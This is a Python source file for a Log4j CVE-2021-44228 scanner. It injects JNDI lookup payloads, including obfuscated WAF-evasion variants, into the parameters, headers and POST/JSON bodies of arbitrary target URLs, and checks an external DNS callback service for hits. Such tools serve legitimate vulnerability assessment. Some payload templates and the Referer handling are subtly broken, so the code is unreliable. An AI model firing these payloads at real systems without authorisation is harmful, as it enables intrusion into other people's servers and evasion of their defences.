#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
from termcolor import cprint

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = 4
waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}"]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')

args = parser.parse_args()


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def get_records(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_url(url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
    for payload in payloads:
        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
        if args.request_type.upper() == "GET" or args.run_all_tests:
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

        if args.request_type.upper() == "POST" or args.run_all_tests:
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")


def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    cprint("[•] Initiating DNS callback server.")
    dns_callback = Dnslog()

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback.domain)

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(args.wait_time)
    records = dns_callback.get_records()
    if len(records) == 0:
        cprint("[•] Targets does not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Target Affected", "yellow")
        for i in records:
            cprint(i, "yellow")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
